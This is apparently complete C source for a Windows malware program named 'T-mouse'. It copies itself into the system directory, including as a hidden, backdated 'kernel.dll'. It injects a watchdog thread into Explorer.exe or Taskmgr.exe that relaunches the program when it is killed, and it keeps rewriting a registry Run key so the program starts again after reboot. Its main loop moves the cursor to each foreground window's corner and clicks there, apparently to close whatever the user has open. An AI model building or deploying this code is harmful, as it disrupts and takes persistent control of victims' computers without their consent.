
#define UNICODE 
#define _UNICODE 
                           
#include <windows.h> 
#include <tchar.h> 
#include <conio.h> 
#include <psapi.h> 
#include <Tlhelp32.h>
#include <stdio.h>
typedef struct _remoteparameter 
{ 
    DWORD       rpoutputdebugstring; 
    DWORD       rpopenprocess; 
    DWORD       rpwaitforsingleobject; 
    DWORD       rpfindfirstfile; 
    DWORD       rpcopyfile; 
    DWORD       rpfindclose; 
    DWORD       rpwinexec; 

    DWORD       rpmousepid; 
    HANDLE      rpprocesshandle;           
    HANDLE      rpfilehandle; 
    TCHAR       rptname[MAX_PATH]; 
    TCHAR       rpkname[MAX_PATH]; 
    char        rpwinexecname[MAX_PATH]; 
    WIN32_FIND_DATA rpfdata; 

    TCHAR       rpoperror[30]; 
    TCHAR       rpffferror[30]; 
    TCHAR       rpcferror[30]; 
    TCHAR       rpfcerror[30]; 
    TCHAR       rpweerror[30]; 
    TCHAR       rpstring[30]; 
    TCHAR       rpwfsosignal[30];             
     
}REMOTEPARAMETER, *PREMOTEPARAMETER; 

DWORD   WINAPI remote(LPVOID pvparam); 
DWORD   WINAPI watch(LPVOID pvparam); 
DWORD   processtopid(TCHAR *processname);   
HANDLE  createremote(PTSTR,PTSTR);     
void    start(void); 

HANDLE wthread; 
TCHAR  *name1=_T("\\T-mouse.exe");   
TCHAR  *name2=_T("\\kernel.dll"); 

int main() 
{ 
    WIN32_FIND_DATA   fdata; 
    HANDLE            ffhandle; 
    HANDLE            fchandle; 
    SYSTEMTIME        stime; 
    FILETIME          ftime; 
    TCHAR             syspath[MAX_PATH]; 
    TCHAR             curname[MAX_PATH]; 
    TCHAR             tname[MAX_PATH]; 
    TCHAR             kname[MAX_PATH]; 
    int               ret; 

    HANDLE            rthread; 

    HWND              hwnd; 
    RECT              rt; 
    POINT             ptnew; 
    TCHAR             title[250]; 



    ret=GetSystemDirectory(syspath,MAX_PATH); 
    if(ret==0) 
    { 
        _tprintf(_T("GetSystemDirectory Error: %d\n"),GetLastError()); 
        getchar();               
        return -1; 
    } 
    _tcscpy(tname,syspath); 
    _tcscat(tname,name1); 
    _tcscpy(kname,syspath); 
    _tcscat(kname,name2); 

    ffhandle=FindFirstFile(tname,&fdata); 
    if(ffhandle==INVALID_HANDLE_VALUE) 
    { 
        if(GetLastError()==2)   
        { 
            ret=GetCurrentDirectory(MAX_PATH,curname); 
            if(ret==0) 
            { 
                _tprintf(_T("GetCurrentDirectory Error: %d\n"),GetLastError()); 
                                   getchar();                
                return -1; 
            } 
            _tcscat(curname,name1); 
            if(!CopyFile(curname,tname,TRUE)) 
            { 
                _tprintf(_T("CopyFile %s Error: %d\n"),tname,GetLastError()); 
                           getchar();               
                return -1; 
            } 
        } 
        else 
        { 
            _tprintf(_T("FindFirstFile %s Error: %d\n"),tname,GetLastError()); 
                               getchar();               
            return -1; 
        } 
    } 
    else if(!FindClose(ffhandle)) 
    { 
        _tprintf(_T("FindClose %s Error: %d\n"),tname,GetLastError()); 
        getchar();                
        return -1; 
    } 
    ffhandle=FindFirstFile(kname,&fdata); 
    if(ffhandle==INVALID_HANDLE_VALUE) 
    { 
        if(GetLastError()==2) 
        { 
            ret=GetCurrentDirectory(MAX_PATH,curname); 
            if(ret==0) 
            { 
                _tprintf(_T("GetCurrentDirectory Error: %d\n"),GetLastError()); 
                                        getchar();                
                return -1; 
            } 
            _tcscat(curname,name1); 
            if(!CopyFile(curname,kname,TRUE)) 
            { 
                _tprintf(_T("CopyFile %s Error: %d\n"),kname,GetLastError()); 
                           getchar();                
                return -1; 
            } 


            fchandle=CreateFile(kname,GENERIC_WRITE,FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL); 
                    if(fchandle==INVALID_HANDLE_VALUE) 
            { 
                _tprintf(_T("CreateFile %s Error: %d\n"),kname,GetLastError()); 
                getchar();                
                return -1; 
            } 

            memset(&stime,0,sizeof(stime)); 
            stime.wYear=2002; 
            stime.wMonth=1; 
            stime.wDay=12; 
            stime.wDayOfWeek=5;     
            stime.wHour=1; 
            if(!SystemTimeToFileTime(&stime,&ftime)) 
            { 
                _tprintf(_T("SystemTimeToFileTime Error: %d\n"),GetLastError()); 
                                 CloseHandle(fchandle); 
                               getchar();             
                return -1; 
            } 
            if(!SetFileTime(fchandle,&ftime,NULL,&ftime)) 
            { 
                               _tprintf(_T("SetFileTime Error: %d\n"),GetLastError()); 
                                 CloseHandle(fchandle); 
               getchar();             
                return -1; 
            } 
            if(!SetFileAttributes(kname, FILE_ATTRIBUTE_READONLY |  FILE_ATTRIBUTE_HIDDEN   |  FILE_ATTRIBUTE_SYSTEM )) 
            { 
                _tprintf(_T("SetFileAttributes Error: %d\n"),GetLastError()); 
                             CloseHandle(fchandle); 
                 getchar();              
                return -1; 
            } 
            CloseHandle(fchandle); 
        } 
        else 
        { 
            _tprintf(_T("FindFirstFile %s Error: %d\n"),kname,GetLastError()); 
            getchar();              
            return -1; 
        } 
    } 
    else if(!FindClose(ffhandle)) 
    { 
        _tprintf(_T("FindClose %s Error: %d\n"),kname,GetLastError()); 
        getchar();             
        return -1; 
    } 

    if((rthread=createremote(tname,kname))==NULL)   
    { 
        _tprintf(_T("CreateRemote Error\n")); 
        getchar();             
                   return -1; 
    } 

    wthread=CreateThread(NULL,0,watch,(LPVOID)rthread,0,NULL); 
    if(wthread==NULL) 
    { 
        _tprintf(_T("CreateThread Error: %d\n"),GetLastError()); 
        CloseHandle(rthread); 
        getchar();          
        return -1; 
    } 

    while(1) 
    { 
        hwnd=GetForegroundWindow(); 
        GetWindowRect(hwnd,&rt); 
        GetCursorPos(&ptnew); 

        if(ptnew.x<rt.right-15) 
            ptnew.x+=3; 
        else if(ptnew.x>rt.right-12) 
            ptnew.x-=3; 

        if(ptnew.y<rt.top+12) 
            ptnew.y+=3; 
        else if(ptnew.y>rt.top+15) 
            ptnew.y-=3; 
        SetCursorPos(ptnew.x,ptnew.y);   
     
                   if((ptnew.x>=rt.right-15) && (ptnew.x<=rt.right-12) 
        && (ptnew.y>=rt.top+12) && (ptnew.y<=rt.top+15) 
        && (_tcslen(title)!=0)) 
        { 
            mouse_event(MOUSEEVENTF_LEFTDOWN,ptnew.x,ptnew.y,0,0); 
            mouse_event(MOUSEEVENTF_LEFTUP,ptnew.x,ptnew.y,0,0); 
        } 

        Sleep(1); 
    } 
    getche();               
    return 0; 
} 
         
DWORD processtopid(TCHAR *szProcessName)
{
	//PROCESSENTRY32这个宏在<Tlhelp32.h>中
	PROCESSENTRY32 pe32 = { 0 };
	pe32.dwSize = sizeof(PROCESSENTRY32);
	//创建线程快照
	HANDLE SnapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	
	if (SnapshotHandle == INVALID_HANDLE_VALUE)
	{
		return 0;
	}
	
	if (!Process32First(SnapshotHandle, &pe32))
	{
		return 0;
	}
	
	do
	{
		if (!_tcsicmp(szProcessName, pe32.szExeFile))
		{
			printf("%s的PID是:%d\n", pe32.szExeFile, pe32.th32ProcessID);
			return pe32.th32ProcessID;
		}
		//Process32Next是一个进程获取函数，当我们利用函数CreateToolhelp32Snapshot()获得当前运行进程的快照后, 我们可以利用Process32Next函数来获得下一个进程的句柄
	} while (Process32Next(SnapshotHandle, &pe32));
	
	return 0;
}

HANDLE createremote(PTSTR ctname,PTSTR ckname) 
{ 
         HANDLE            ethread; 
    HANDLE            rphandle; 
    TCHAR             name[2][15]; 
    TCHAR             *remotethr; 
    TCHAR             *remotepar; 
    DWORD             remotepid; 
    int               cb; 
         int               signal; 
    HINSTANCE         hkernel32; 
    REMOTEPARAMETER   rp; 

    _tcscpy(name[0],_T("Explorer.exe")); 
    _tcscpy(name[1],_T("Taskmgr.exe")); 
    signal=1; 
    while(1) 
    { 
        remotepid=processtopid(name[(++signal)%2]); 
        if(remotepid==-1)         
        { 
            return NULL; 
        } 
        else if(remotepid==0) 
        { 
            OutputDebugString(_T("Remote Process isn't running\n")); 
            Sleep(1000); 
            continue; 
        } 
        rphandle=OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE,remotepid); 
        if(rphandle==NULL) 
        { 
                      Sleep(1000); 
            continue; 
        } 
        else 
        { 
            break; 
        } 
    } 

    cb=sizeof(TCHAR)*4*1024; 
    remotethr=(PTSTR)VirtualAllocEx(rphandle,NULL,cb,MEM_COMMIT,PAGE_EXECUTE_READWRITE); 
    if(remotethr==NULL) 
    { 
        _tprintf(_T("VirtualAllocEx for Thread Error: %d\n"),GetLastError()); 
                  CloseHandle(rphandle);       
        return NULL; 
    } 
       if(WriteProcessMemory(rphandle,remotethr,(LPVOID)remote,cb,NULL)==FALSE) 
    { 
        _tprintf(_T("WriteProcessMemory for Thread Error: %d\n"),GetLastError()); 
                  CloseHandle(rphandle); 
        return NULL; 
    } 
    {   
        memset(&rp,0,sizeof(rp)); 
        rp.rpmousepid=GetCurrentProcessId(); 
        _tcscpy(rp.rpstring,_T("i am in remote process\n")); 
        _tcscpy(rp.rpcferror,_T("CopyFile Error\n")); 
        _tcscpy(rp.rpfcerror,_T("FindClose Error\n")); 
        _tcscpy(rp.rpffferror,_T("FindFirstFile Error\n")); 
        _tcscpy(rp.rpoperror,_T("OpenProcess Error\n")); 
        _tcscpy(rp.rpweerror,_T("WinExec Error\n")); 
        _tcscpy(rp.rpwfsosignal,_T("i am out of remote process\n")); 
                  _tcscpy(rp.rptname,ctname); 
        _tcscpy(rp.rpkname,ckname); 
        WideCharToMultiByte(CP_ACP,0,ctname,-1,rp.rpwinexecname,_tcslen(ctname),NULL,NULL); 
         
        hkernel32=GetModuleHandle(_T("kernel32.dll")); 
        rp.rpoutputdebugstring=(DWORD)GetProcAddress(hkernel32,"OutputDebugStringW"); 
        rp.rpopenprocess=(DWORD)GetProcAddress(hkernel32,"OpenProcess"); 
        rp.rpwaitforsingleobject=(DWORD)GetProcAddress(hkernel32,"WaitForSingleObject"); 
        rp.rpfindfirstfile=(DWORD)GetProcAddress(hkernel32,"FindFirstFileW"); 
        rp.rpcopyfile=(DWORD)GetProcAddress(hkernel32,"CopyFileW"); 
        rp.rpfindclose=(DWORD)GetProcAddress(hkernel32,"FindClose"); 
        rp.rpwinexec=(DWORD)GetProcAddress(hkernel32,"WinExec"); 
    }                                                                         
    cb=sizeof(TCHAR)*sizeof(rp); 
    remotepar=(PTSTR)VirtualAllocEx(rphandle,NULL,cb,MEM_COMMIT,PAGE_READWRITE); 
    if(remotepar==NULL) 
    { 
        _tprintf(_T("VirtualAllocEx for Parameter Error: %d\n"),GetLastError()); 
        CloseHandle(rphandle); 
        return NULL; 
    } 
    if(WriteProcessMemory(rphandle,remotepar,(LPVOID)&rp,cb,NULL)==FALSE) 
    { 
        _tprintf(_T("WriteProcessMemory for Parameter Error: %d\n"),GetLastError()); 
        CloseHandle(rphandle); 
        return NULL; 
    } 
     
    ethread=CreateRemoteThread(rphandle,NULL,0,(LPTHREAD_START_ROUTINE)remotethr,(LPVOID)remotepar,0,NULL); 
    if(ethread==NULL) 
    { 
        _tprintf(_T("CreateRemoteThread Error: %d\n"),GetLastError()); 
        CloseHandle(rphandle); 
        return NULL; 
    } 
    return ethread; 
} 


DWORD WINAPI watch(LPVOID pvparam) 
{ 
    HANDLE            wethread=(HANDLE)pvparam; 
    DWORD             exitcode; 
     
    HKEY              hkey; 
    TCHAR             sname[MAX_PATH]; 
    TCHAR             wtname[MAX_PATH]; 
    TCHAR             wkname[MAX_PATH]; 
    TCHAR             lpdata[MAX_PATH];   
    LPCTSTR           rgspath=_T("Software\\Microsoft\\Windows\\CurrentVersion\\Run"); 
    DWORD             type=REG_SZ; 
    DWORD             dwbuflen=MAX_PATH;   
         int               ret; 

         if((ret=GetSystemDirectory(sname,MAX_PATH))==0) 
    { 
             _tprintf(_T("GetSystemDirectory in watch Error: %d\n"),GetLastError()); 
              return -1; 
    } 
       _tcscpy(wtname,sname); 
       _tcscat(wtname,name1); 
    _tcscpy(wkname,sname); 
    _tcscat(wkname,name2); 

    while(1) 
    {   
                  ret=RegOpenKeyEx(HKEY_LOCAL_MACHINE,rgspath,0,KEY_QUERY_VALUE,&hkey); 
        if(ret!=ERROR_SUCCESS) 
        { 
            _tprintf(_T("RegOpenKeyEx for KEY_QUERY_VALUE Error: %d\n"),GetLastError()); 
            break; 
        } 
        ret=RegQueryValueEx(hkey,_T("T-mouse"),NULL,NULL,(LPBYTE)lpdata,&dwbuflen); 
        RegCloseKey(hkey); 
        if(ret!=ERROR_SUCCESS) 
        { 
            ret=RegOpenKeyEx(HKEY_LOCAL_MACHINE,rgspath,0,KEY_WRITE,&hkey); 
            if(ret!=ERROR_SUCCESS) 
            { 
                _tprintf(_T("RegOpenKeyEx for KEY_WRITE Error: %d\n"),GetLastError()); 
                break; 
            } 
            ret=RegSetValueEx(hkey,_T("T-mouse"),NULL,type,(const byte *)wtname,dwbuflen); 
            RegCloseKey(hkey); 
            if(ret!=ERROR_SUCCESS) 
            { 
                _tprintf(_T("RegSetValueEx Error: %d\n"),GetLastError()); 
                break; 
            } 
        } 

        GetExitCodeThread(wethread,&exitcode); 
        if(exitcode!=STILL_ACTIVE) 
        { 
            wethread=createremote(wtname,wkname); 
        } 
        Sleep(1000);     
    } 
    return 0; 
} 


DWORD WINAPI remote(LPVOID pvparam) 
{ 
    PREMOTEPARAMETER erp=(PREMOTEPARAMETER)pvparam; 

    typedef VOID   (WINAPI *EOutputDebugString)(LPCTSTR); 
    typedef HANDLE (WINAPI *EOpenProcess)(DWORD, BOOL, DWORD); 
    typedef DWORD  (WINAPI *EWaitForSingleObject)(HANDLE, DWORD); 
         typedef HANDLE (WINAPI *EFindFirstFile)(LPCTSTR, LPWIN32_FIND_DATA); 
    typedef BOOL   (WINAPI *ECopyFile)(LPCTSTR, LPCTSTR, BOOL); 
    typedef BOOL   (WINAPI *EFindClose)(HANDLE); 
    typedef UINT   (WINAPI *EWinExec)(LPCSTR, UINT); 

    EOutputDebugString   tOutputDebugString; 
    EOpenProcess         tOpenProcess; 
    EWaitForSingleObject tWaitForSingleObject; 
    EFindFirstFile       tFindFirstFile; 
    ECopyFile            tCopyFile; 
    EFindClose           tFindClose; 
    EWinExec             tWinExec; 

    tOutputDebugString=(EOutputDebugString)erp->rpoutputdebugstring; 
    tOpenProcess=(EOpenProcess)erp->rpopenprocess; 
    tWaitForSingleObject=(EWaitForSingleObject)erp->rpwaitforsingleobject; 
    tFindFirstFile=(EFindFirstFile)erp->rpfindfirstfile; 
    tCopyFile=(ECopyFile)erp->rpcopyfile; 
    tFindClose=(EFindClose)erp->rpfindclose; 
    tWinExec=(EWinExec)erp->rpwinexec; 

    tOutputDebugString(erp->rpstring); 

    erp->rpprocesshandle=tOpenProcess(PROCESS_ALL_ACCESS,FALSE,erp->rpmousepid); 
    if(erp->rpprocesshandle==NULL) 
    { 
        tOutputDebugString(erp->rpoperror); 
        return -1; 
    } 
    tWaitForSingleObject(erp->rpprocesshandle,INFINITE); 
    tOutputDebugString(erp->rpwfsosignal); 

    erp->rpfilehandle=tFindFirstFile(erp->rptname,&erp->rpfdata); 
    if(erp->rpfilehandle==INVALID_HANDLE_VALUE) 
    { 
        tOutputDebugString(erp->rpffferror); 
        if(!tCopyFile(erp->rpkname,erp->rptname,TRUE)) 
        { 
            tOutputDebugString(erp->rpcferror); 
            return -1; 
        } 
    } 
    if(!tFindClose(erp->rpfilehandle)) 
    { 
        tOutputDebugString(erp->rpfcerror); 
        return -1; 
    } 
         
    if(tWinExec(erp->rpwinexecname, 0)<=31)               
    { 
        tOutputDebugString(erp->rpweerror); 
        return -1; 
    } 
    return 0; 
} 